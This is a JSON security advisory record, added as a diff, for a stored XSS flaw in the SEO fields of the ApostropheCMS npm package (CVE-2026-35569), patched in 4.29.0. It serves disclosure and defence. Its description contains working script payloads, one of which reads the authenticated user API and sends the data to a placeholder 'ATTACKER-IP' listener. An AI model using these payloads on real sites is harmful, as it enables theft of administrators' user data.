@@ -1,0 +1,56 @@
+{
+  "Severity": "HIGH",
+  "UpdatedAt": "2026-04-16T20:44:20Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "apostrophe"
+  },
+  "Advisory": {
+    "DatabaseId": 349734,
+    "Id": "GSA_kwCzR0hTQS04NTVjLXIydnEtYzI5Ms4ABVYm",
+    "GhsaId": "GHSA-855c-r2vq-c292",
+    "References": [
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-855c-r2vq-c292"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-35569"
+      },
+      {
+        "Url": "https://github.com/apostrophecms/apostrophe/commit/0e57dd07a56ae1ba1e3af646ba026db4d0ab5bb3"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-855c-r2vq-c292"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-855c-r2vq-c292"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-35569"
+      }
+    ],
+    "Description": "## Summary\n\nA stored cross-site scripting (XSS) vulnerability exists in SEO-related fields (SEO Title and Meta Description) in ApostropheCMS.\n\nImproper neutralization of user-controlled input in SEO-related fields allows injection of arbitrary JavaScript into HTML contexts, resulting in stored cross-site scripting (XSS). This can be leveraged to perform authenticated API requests and exfiltrate sensitive data, resulting in a compromise of application confidentiality.\n\n## Affected Version\nApostropheCMS (tested on version: v4.28.0)\n\n## Vulnerability Details\nUser-controlled input in SEO fields is improperly handled and rendered into HTML contexts such as:\n\n- `\u003ctitle\u003e`\n- `\u003cmeta\u003e` attributes\n- structured data (JSON-LD)\n\nThis allows attackers to inject and execute arbitrary JavaScript in the context of authenticated users.\n\n\n\n## PoC 1\n\n**The following payload demonstrates breaking out of HTML context:**\n```javascript\n\"\u003e\u003c/title\u003e\u003cscript\u003ealert(1)\u003c/script\u003e\n```\nThis confirms:\n  - Improper output encoding\n  - Ability to escape `\u003ctitle\u003e / \u003cmeta\u003e` contexts\n  - Arbitrary script execution\n\n## PoC 2\n**This PoC demonstrates how the stored XSS can be leveraged to perform authenticated API requests and exfiltrate sensitive data.**\n```javascript\n\"\u003e\u003c/title\u003e\u003cscript\u003e\nfetch('/api/v1/@apostrophecms/user', {\n  credentials:'include'\n})\n.then(r=\u003er.text())\n.then(d=\u003e{\n  fetch('http://ATTACKER-IP:5656/?data='+btoa(d))\n})\n\u003c/script\u003e\n```\n\n\n## Video Proof of Concept\n\nWatch the following YouTube video for a full demonstration of the exploit:\n\n**PoC Video:** https://youtu.be/FZuulua_pa8\n\n\n## Steps to Reproduce\n\n1. Start a local listener: `python3 -m http.server 5656`\n2. Login to ApostropheCMS as an authenticated user\n3.  Create or edit a page\n4.  Navigate to SEO settings\n5.  Insert the payload into the SEO Title field  and  Meta Description\n```javascript\n\"\u003e\u003c/title\u003e\u003cscript\u003e\nfetch('/api/v1/@apostrophecms/user',{\n  credentials:'include'\n})\n.then(r=\u003er.text())\n.then(d=\u003e{\n  fetch('http://ATTACKER-IP:5656/?data='+btoa(d))\n})\n\u003c/script\u003e\n```\n6.  Set **Schema Type** to \"Web page\"\n7.  Save and publish the page\n8.  Have an administrator visit the page\n\n\n## Result\n- The payload executes in the admin’s browser\n- The script sends a request to: `/api/v1/@apostrophecms/user`\n- The response contains sensitive user data:\n  - usernames\n  - email addresses\n  - roles (including admin)\n\n- The data is exfiltrated to the attacker-controlled server:\n  - `http://ATTACKER-IP:5656`\n\n## Evidence\n- The attacker server receives:\n  - `GET /?data=BASE64_ENCODED_RESPONSE`\n- Decoding the response reveals sensitive application data.\n\n## Security Impact\nThis vulnerability allows an attacker to:\n  - Execute arbitrary JavaScript in an authenticated admin context\n  - Perform authenticated API requests (session riding)\n  - Access sensitive application data via internal APIs\n  - Exfiltrate sensitive data to an external attacker-controlled server",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-04-16T20:44:18Z",
+    "Severity": "HIGH",
+    "Summary": "Stored XSS in SEO Fields Leads to Authenticated API Data Exposure in ApostropheCMS",
+    "UpdatedAt": "2026-04-16T20:44:20Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 8.7,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "4.29.0"
+      },
+      "VulnerableVersionRange": "\u003c= 4.28.0"
+    }
+  ]
+}
